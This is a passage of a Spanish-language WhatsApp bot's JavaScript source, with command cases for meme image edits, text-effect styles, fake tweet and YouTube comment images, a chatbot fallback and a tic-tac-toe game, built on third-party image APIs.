if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
 m = args.join(" ")
 m1 = m.split("|")[0];
 m2 = m.split("|")[1]; 
reply(mess.wait)
	    	try {
let sb = await getBuffer(`https://api-alc.herokuapp.com/api/edit/sadboy?texto=${m1}&texto2=${m2}&apikey=ConfuMods`)
				cnf.sendMessage(from, sb, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break 
				 
case 'edit-nekogirl':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
 m = args.join(" ")
 m1 = m.split("|")[0];
 m2 = m.split("|")[1]; 

reply(mess.wait)
	    	try {
let ng = await getBuffer(`https://api-alc.herokuapp.com/api/edit/girlneko?texto=${m1}&texto2=${m2}&apikey=ConfuMods`)
				cnf.sendMessage(from, ng, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
case 'edit-patricio':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
		try {
		pp = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		usuy = await getBuffer(pp)
		pporang = await upload(usuy)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }

	    	try {
let patr = await getBuffer(`https://api-alc.herokuapp.com/api/edit/patricio?imagen=${pporang}&apikey=ConfuMods`)
				cnf.sendMessage(from, patr, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
	
			
	case 'edit-bobspj':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
		try {
		pp = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		usuy = await getBuffer(pp)
		pporang = await upload(usuy)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }

	    	try {
let bob = await getBuffer(`https://api-alc.herokuapp.com/api/edit/spongebob?imagen=${pporang}&apikey=ConfuMods`)
				cnf.sendMessage(from, bob, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
			
						

////////////////

 case 'blackpink':
 case 'rainbow2':
 case 'water_pipe':
 case 'halloween':
 case 'sketch':
 case 'sircuit':
 case 'discovery':
 case 'metallic2':
 case 'fiction':
 case 'demon':
 case 'transformer':
 case 'berry':
 case 'thunder':
 case 'magma':
 case '3dstone':
 case 'neon':
 case 'glitch':
 case 'harry_potter':
 case 'embossed':
 case 'broken':
 case 'papercut':
 case 'gradient':
 case 'glossy':
 case 'watercolor':
 case 'multicolor':
 case 'neon_devil':
 case 'underwater':
 case 'bear':
 case 'wonderfulg':
 case 'christmas':
 case 'neon_light':
 case 'snow':
 case 'cloudsky':
 case 'luxury2':
 case 'gradient2':
 case 'summer':
 case 'writing':
 case 'engraved':
 case 'summery':
 case '3dglue':
 case 'metaldark':
 case 'neonlight':
 case 'oscar':
 case 'minion':
 case 'holographic':
 case 'purple':
 case 'glossyb':
 case 'deluxe2':
 case 'glossyc':
 case 'fabric':
 case 'neonc':
 case 'newyear':
 case 'newyear2':
 case 'metals':
 case 'xmas':
 case 'blood':
 case 'darkg':
 case 'joker':
 case 'wicker':
 case 'natural':
 case 'firework':
 case 'skeleton':
 case 'balloon':
 case 'balloon2':
 case 'balloon3':
 case 'balloon4':
 case 'balloon5':
 case 'balloon6':
 case 'balloon7':
 case 'steel':
 case 'gloss':
 case 'denim':
 case 'decorate':
 case 'decorate2':
 case 'peridot':
 case 'rock':
 case 'glass':
 case 'glass2':
 case 'glass3':
 case 'glass4':
 case 'glass5':
 case 'glass6':
 case 'glass7':
 case 'glass8':
 case 'captain_as2':
 case 'robot':
 case 'equalizer':
 case 'toxic':
 case 'sparkling':
 case 'sparkling2':
 case 'sparkling3':
 case 'sparkling4':
 case 'sparkling5':
 case 'sparkling6':
 case 'sparkling7':
 case 'decorative':
 case 'chocolate':
 case 'strawberry':
 case 'koifish':
 case 'bread':
 case 'matrix':
 case 'blood2':
 case 'neonligth2':
 case 'thunder2':
 case '3dbox':
 case 'neon2':
 case 'roadw':
 case 'bokeh':
 case 'gneon':
 case 'advanced':
 case 'dropwater':
 case 'wall':
 case 'chrismast':
 case 'honey':
 case 'drug':
 case 'marble':
 case 'marble2':
 case 'ice':
 case 'juice':
 case 'rusty':
 case 'abstra':
 case 'biscuit':
 case 'wood':
 case 'scifi':
 case 'metalr':
 case 'purpleg':
 case 'shiny':
 case 'jewelry':
 case 'jewelry2':
 case 'jewelry3':
 case 'jewelry4':
 case 'jewelry5':
 case 'jewelry6':
 case 'jewelry7':
 case 'jewelry8':
 case 'metalh':
 case 'golden':
 case 'glitter':
 case 'glitter2':
 case 'glitter3':
 case 'glitter4':
 case 'glitter5':
 case 'glitter6':
 case 'glitter7':
 case 'metale':
 case 'carbon':
 case 'candy':
 case 'metalb':
 case 'gemb':
 case '3dchrome':
 case 'metalb2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                

if (args.length < 1) return reply('Falta el texto')
texto = args.join(" ")
reply(mess.wait)
	    	try {
let textpro2 = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/${command}?apikey=${alphakey}&text=${texto}`)
				cnf.sendMessage(from, textpro2, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
				
case 'horny':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	try {
		try {
		pporan = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporan = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const imagenn = await getBuffer(pporan)
					
				    anuu = await upload(imagenn)
	
anu = await getBuffer(`https://api-alc.herokuapp.com/api/edit/horny?imagen=${anuu}&apikey=ConfuMods`)
cnf.sendMessage(from, anu, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break

case 'simp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
	    	try {
		try {
		pporan = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporan = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		 imag = await getBuffer(pporan)
					
				    anuu = await upload(imag)

mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid		
anu = await getBuffer(`https://api-alc.herokuapp.com/api/edit/simp?imagen=${anuu}&apikey=ConfuMods`)
cnf.sendMessage(from, anu, image, {quoted: mek, caption: `Autorizado para ser Simp de @${mentioned[0].split('@')[0]}`})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break

case 'tweet':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
const queri = args.join(' ')
					const texto1 = queri.split('|')[0]
					const texto2 = queri.split('|')[1]
					const texto3 = queri.split('|')[2]			
	    	try {
		try {
		pporan = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporan = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		 ima = await getBuffer(pporan)
					
				    anuu = await upload(ima)
	
anu = await getBuffer(`https://api-alc.herokuapp.com/api/edit/twfake?imagen=${anuu}&username=${texto1}&username2=${texto2}&comment=${texto3}&apikey=ConfuMods`)
cnf.sendMessage(from, anu, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break

////////////////

case 'ytcomment':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
 queryy = args.join(' ')
					 texto11 = queryy.split('|')[0]
					 texto21 = queryy.split('|')[1]						
	    	try {
		try {
		pporan = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporan = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		  imaj = await getBuffer(pporan)
					
				    anuu = await upload(imaj)
	
anu = await getBuffer(`https://api-alc.herokuapp.com/api/edit/ytfake?imagen=${anuu}&username=${texto11}&comment=${texto21}&apikey=ConfuMods`)
cnf.sendMessage(from, anu, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break







/*yoiz = await getBuffer(anu.result)
anu = await fetchJson*/

/*                    if (args.length < 1) return reply(`*Ejemplo :*\n${prefix}${command} Alcatraz`)

					makell = args.join(" ")
*/



		default:break



		}
		
if (!isGroup && !isCmd && !mek.key.fromMe && !autorespon) {
u = args.join(" ")
                    if (cmd.length < 1) return reply(`*Texto vacio?*`)
	           anu = await fetchJson(`https://api-alc.herokuapp.com/api/other/simi?text=${cmd}&apikey=ConfuMods`)
res = anu.result;
	                        cnf.sendMessage(from, res, text, {quoted: mek})
	                        				  }

		
		if (isTTT && iser2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Tictactoe 🎲*

er1 @${tty.er1.split('@')[0]}=❌
er2 @${tty.er2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Turno de = @${tty.er1.split('@')[0]}`
  cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.er1,tty.er2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
cnf.sendMessage(from, `Ya @${tty.er2.split('@')[0]} se niega a participar :(

*(Le teme al éxito 👎👎👎👎)*`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.er2]}})
}
}

if (isTTT && iser1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Ingrese los números correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya lleno, utiliza los otros vacíos')
if (main[0].gilir.includes(sender)) return reply('Espera tu turno!.')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].er1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Resultado 🎲

*El ganador es : *@${tty.er1.split('@')[0]} UwU*\n`
ucapan2 = `*🎳 Result 🎲*

*El resultado final:*

${ttt}`
cnf.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.er1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Resultado 🎲*

*_Empate 🐢_*`
ucapan2 = `*🎳 Resultado 🎲*

*El resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Tictactoe 🎲*

er2 @${tty.er2.split('@')[0]}=⭕
er1 @${tty.er1.split('@')[0]}=❌

${ttt}

Turno de = @${tty.er2.split('@')[0]}`
 cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.er1,tty.er2]}})
}
if (isTTT && iser2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Ingrese el número correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya lleno, utiliza los otros')
if (main[0].gilir.includes(sender)) return reply('Espera tu turno!.')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].er2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Resultado 🎲*

El ganador es : *@${tty.er2.split('@')[0]}*\n`
ucapan2 = `*🎳 Tictactoe 🎲*

*El resultado final:*

${ttt}`
cnf.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.er2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Resultado 🎲*

*Empate 🐢👎*`
ucapan2 = `*🎳 Resultado 🎲*

*El resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Tictactoe 🎲*

er1 @${tty.er1.split('@')[0]}=⭕
er2 @${tty.er2.split('@')[0]}=❌

${ttt}
 
Turno de = @${tty.er1.split('@')[0]}`
 cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.er1,tty.er2]}})
 }
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('|ERROR|', 'red'), color(e, 'cyan'))
    /* cnf.sendMessage(`${settings.NumeroOwner}@s.whatsapp.net`, `─────「 *ALERTA-DE-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Desarrollador del ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./alcatraz.jpg'),sourceUrl:"https://youtube.com/c/ConfuMods"}}})*/
	}
    }
    }
    }
    }
    }
    }